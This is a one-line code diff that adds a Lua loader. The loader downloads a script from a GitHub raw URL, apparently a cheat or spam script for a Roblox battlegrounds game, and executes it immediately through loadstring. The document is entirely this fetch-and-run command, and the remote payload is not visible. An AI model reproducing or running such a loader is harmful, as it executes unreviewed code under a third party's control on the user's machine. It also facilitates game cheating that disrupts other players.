@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/shinji-legends-battlegrounds-spam3-f75dr78wo6312d.lua"))()
